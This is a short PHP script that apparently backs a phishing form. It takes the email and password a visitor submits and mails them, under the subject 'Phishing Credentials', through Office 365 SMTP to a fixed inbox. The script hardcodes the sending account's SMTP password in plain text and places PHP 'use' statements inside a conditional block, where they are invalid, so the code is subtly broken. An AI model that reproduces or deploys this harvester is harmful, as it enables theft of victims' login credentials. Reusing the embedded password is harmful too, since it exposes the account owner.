<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Retrieve form data
    $email = $_POST['email']; // Assuming input name is 'email'
    $password = $_POST['password']; // Assuming input name is 'password'

    // Outlook SMTP server settings
    $smtpHost = 'smtp.office365.com';
    $smtpUsername = 'italert@favorich.com'; // Your Outlook email address
    $smtpPassword = 'Vov71807'; // Your Outlook password
    $smtpPort = 587; // Port for TLS/STARTTLS

    // Email details
    $to = 'yicheng.yeong@favorich.com'; // Change this to your email address
    $subject = 'Phishing Credentials';
    $message = "Email/Username: $email\nPassword: $password";

    // PHPMailer library for sending email via SMTP
    use PHPMailer\PHPMailer\PHPMailer;
    use PHPMailer\PHPMailer\Exception;
    require 'vendor/autoload.php'; // Path to PHPMailer autoload.php

    // Create PHPMailer object
    $mail = new PHPMailer(true);

    try {
        //Server settings
        $mail->isSMTP();
        $mail->Host = $smtpHost;
        $mail->SMTPAuth = true;
        $mail->Username = $smtpUsername;
        $mail->Password = $smtpPassword;
        $mail->SMTPSecure = 'tls'; // Enable TLS encryption, `ssl` also accepted
        $mail->Port = $smtpPort;

        //Recipients
        $mail->setFrom($smtpUsername);
        $mail->addAddress($to);

        //Content
        $mail->isHTML(false); // Set email format to plain text
        $mail->Subject = $subject;
        $mail->Body = $message;

        // Send email
        $mail->send();
        echo 'Email has been sent successfully';
    } catch (Exception $e) {
        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }
}
?>
